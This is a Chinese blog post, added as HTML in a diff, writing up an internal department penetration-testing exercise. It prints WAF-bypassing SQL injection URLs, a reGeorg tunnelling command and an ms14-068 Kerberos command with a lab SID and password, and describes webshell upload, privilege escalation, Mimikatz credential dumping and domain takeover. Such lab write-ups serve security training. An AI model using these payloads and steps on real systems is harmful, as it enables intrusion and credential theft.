@@ -1,0 +1,106 @@
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="一次内部练习"><meta name="keywords" content="内网渗透"><meta name="author" content="rootrain"><meta name="copyright" content="rootrain"><title>一次内部练习 | rootrain's Home</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-入口"><span class="toc-number">1.</span> <span class="toc-text">0x01 入口</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-SQL注入"><span class="toc-number">2.</span> <span class="toc-text">0x02 SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-另一个入口"><span class="toc-number">3.</span> <span class="toc-text">0x03 另一个入口</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-getshell"><span class="toc-number">4.</span> <span class="toc-text">0x04 getshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-提权"><span class="toc-number">5.</span> <span class="toc-text">0x05 提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-进入内网"><span class="toc-number">6.</span> <span class="toc-text">0x06 进入内网</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">rootrain</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">4</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">3</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">4</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">rootrain's Home</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives/">Archives</a><a class="site-page" href="/tags/">Tags</a><a class="site-page" href="/categories/">Categories</a></span></div><div id="post-info"><div id="post-title">一次内部练习</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-05-21</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/内网渗透/">内网渗透</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/内网渗透/SQL注入/">SQL注入</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>去年年中，部门弄了一次比较有意思的小比赛，难度不大，主要是普及一些内网的知识。</p>
+<a id="more"></a>
+<h1 id="0x01-入口"><a href="#0x01-入口" class="headerlink" title="0x01 入口"></a>0x01 入口</h1><p>web1:</p>
+<p><a href="http://172.16.8.8" target="_blank" rel="noopener">http://172.16.8.8</a></p>
+<p>web2:</p>
+<p><a href="http://172.16.8.8:82" target="_blank" rel="noopener">http://172.16.8.8:82</a></p>
+<h1 id="0x02-SQL注入"><a href="#0x02-SQL注入" class="headerlink" title="0x02 SQL注入"></a>0x02 SQL注入</h1><p>两个入口都能进到内网，web1主要是找exp，环境是linux+discuz6.0，能用的漏洞很多，但是我当时没利用成功，就不写了，影响不大。</p>
+<p>web2是一个商城系统，加单引号报错了，说明可能存在注入</p>
+<p><img src="/images/2018-half-year-wp/1.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.8.8/product.php?id=12&apos; and &apos;&apos;=&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2018-half-year-wp/2.png" alt></p>
+<p>安全狗，此地无银三百两，估计就是考绕狗注入了，难度不大，直接发payload了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.8.8/product.php?id=12&apos;/*%!AA*/order/*%!AA*/by/*%!AA*/1 -- -</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2018-half-year-wp/3.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.8.8/product.php?id=12&apos;/*%!AA*/order/*%!AA*/by/*%!AA*/7 -- -</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2018-half-year-wp/4.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.8.8/product.php?id=12&apos;/*%!AA*/order/*%!AA*/by/*%!AA*/6 -- -</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2018-half-year-wp/5.png" alt></p>
+<p>字段数是6</p>
+<p>当前数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.8.8/product.php?id=12&apos;/*%!AA*/union/*%!AA*/select/*%!AA*/1,database/*%!AA*/(),3,4,5,6 -- -</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2018-half-year-wp/6.png" alt></p>
+<p>查表，将数据库名转换成16进制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.8.8/product.php?id=12&apos;/*%!AA*/union/*%!AA*/select/*%!AA*/1,table_name,3,4,5,6/*c&apos;*/from/*c&apos;*/information_schema.tables/*%!AA*/where/*%!AA*/table_schema=0x736D61727473686F70-- -</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2018-half-year-wp/7.png" alt></p>
+<p>提示中flag在数据库里面，通过limit查其他的表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.8.8/product.php?id=12&apos;/*%!AA*/union/*%!AA*/select/*%!AA*/1,table_name,3,4,5,6/*c&apos;*/from/*c&apos;*/information_schema.tables/*%!AA*/where/*%!AA*/table_schema=0x736D61727473686F70 limit 0,6-- -</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2018-half-year-wp/8.png" alt></p>
+<p>爆字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.8.8/product.php?id=12&apos;/*%!AA*/union/*%!AA*/select/*%!AA*/1,group_concat(column_name),3,4,5,6/*c&apos;*/from/*c&apos;*/information_schema.columns/*%!AA*/where/*%!AA*/table_name=0x666C6167 -- -</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2018-half-year-wp/9.png" alt></p>
+<p>爆数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.8.8/product.php?id=12&apos;/*%!AA*/union/*%!AA*/select/*%!AA*/1,flag,3,4,5,6/*c&apos;*/from/*c&apos;*/flag -- -</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2018-half-year-wp/10.png" alt></p>
+<p>后面发现，有phpmyadmin(当时没想到要扫服务，毕竟VMware vSphere性能有限，如果都做扫描的话，网站可能会承受不住)，可以登录写shell。</p>
+<h1 id="0x03-另一个入口"><a href="#0x03-另一个入口" class="headerlink" title="0x03 另一个入口"></a>0x03 另一个入口</h1><p>扫描端口，发现还有8080端口</p>
+<p>nmap -F -sV -Pn 172.16.8.8</p>
+<p><img src="/images/2018-half-year-wp/11.png" alt></p>
+<p>点击重新登录：</p>
+<p><img src="/images/2018-half-year-wp/12.png" alt></p>
+<p>没有验证码，弱口令爆破：</p>
+<p><img src="/images/2018-half-year-wp/13.png" alt></p>
+<p>系统公告</p>
+<p><img src="/images/2018-half-year-wp/14.png" alt></p>
+<h1 id="0x04-getshell"><a href="#0x04-getshell" class="headerlink" title="0x04 getshell"></a>0x04 getshell</h1><p>采购入库任意文件上传：</p>
+<p><img src="/images/2018-half-year-wp/15.png" alt></p>
+<p><img src="/images/2018-half-year-wp/16.png" alt></p>
+<p><img src="/images/2018-half-year-wp/17.png" alt></p>
+<p>上传shell</p>
+<p><img src="/images/2018-half-year-wp/18.png" alt></p>
+<p>返回上一级目录：</p>
+<p><img src="/images/2018-half-year-wp/19.png" alt></p>
+<h1 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h1><p>查看当前权限：</p>
+<p><img src="/images/2018-half-year-wp/20.png" alt></p>
+<p>提示说在桌面可能还有flag,但是当前权限无法访问桌面，所有需要提权</p>
+<p>使用ms16-032进行提权：</p>
+<p><img src="/images/2018-half-year-wp/21.png" alt></p>
+<p>使用cobaltstrike进行上线：</p>
+<p><img src="/images/2018-half-year-wp/22.png" alt></p>
+<p>查找桌面的flag:</p>
+<p><img src="/images/2018-half-year-wp/23.png" alt></p>
+<h1 id="0x06-进入内网"><a href="#0x06-进入内网" class="headerlink" title="0x06 进入内网"></a>0x06 进入内网</h1><p>对内网进行探测，发现存在另一个网段：192.168.10.0/24</p>
+<p>使用regeorg代理，扫描后发现存在ms17010漏洞（其实这个不是考点，出题人打了补丁忘记重启了，嘿嘿，如果不用ms17010就要转发访问内网服务器的web进行渗透）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python regeorg.py -u &quot;http://172.16.8.8:8080/Images/tunnel.ashx&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2018-half-year-wp/24.png" alt></p>
+<p>使用exp反弹shell回来</p>
+<p><img src="/images/2018-half-year-wp/25.png" alt></p>
+<p>创建用户，通过cobaltstrike进行连接:</p>
+<p><img src="/images/2018-half-year-wp/26.png" alt></p>
+<p><img src="/images/2018-half-year-wp/27.png" alt></p>
+<p><img src="/images/2018-half-year-wp/28.png" alt></p>
+<p><img src="/images/2018-half-year-wp/29.png" alt></p>
+<p>使用Mimikatz抓密码：</p>
+<p><img src="/images/2018-half-year-wp/30.png" alt></p>
+<p>查看桌面flag</p>
+<p><img src="/images/2018-half-year-wp/31.png" alt></p>
+<p>还有另一台PC2</p>
+<p>PC1与PC2存在通用账户admin</p>
+<p>使用通用密码进行登录：</p>
+<p><img src="/images/2018-half-year-wp/32.png" alt></p>
+<p><img src="/images/2018-half-year-wp/33.png" alt></p>
+<p><img src="/images/2018-half-year-wp/34.png" alt></p>
+<p><img src="/images/2018-half-year-wp/35.png" alt></p>
+<p><img src="/images/2018-half-year-wp/36.png" alt></p>
+<p>ifconfig /all 发现dns是192.168.100.10，推测是域控，从端口也可以推断出是域控（开放了88、389、53等端口）。</p>
+<p>查询GPP密码，发现不存在历史密码。</p>
+<p>使用ms14068进行攻击，上传ms14068.exe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u test2@aclab.com -s S-1-5-21-4073582663-3176860511-3241980539-1103 -d 192.168.100.10 -p Test123/com</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2018-half-year-wp/37.png" alt></p>
+<p>使用Mimikatz进行注入：</p>
+<p><img src="/images/2018-half-year-wp/38.png" alt></p>
+<p>这样就获取了域控的权限</p>
+<p><img src="/images/2018-half-year-wp/39.png" alt></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">rootrain</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://rootrain.me/2019/05/21/一次内部练习/">https://rootrain.me/2019/05/21/一次内部练习/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/内网渗透/">内网渗透</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2019/05/01/mysql注入复习/"><span>mysql注入复习</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2019 By rootrain</div><div class="framework-info"></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+}</script></body></html>
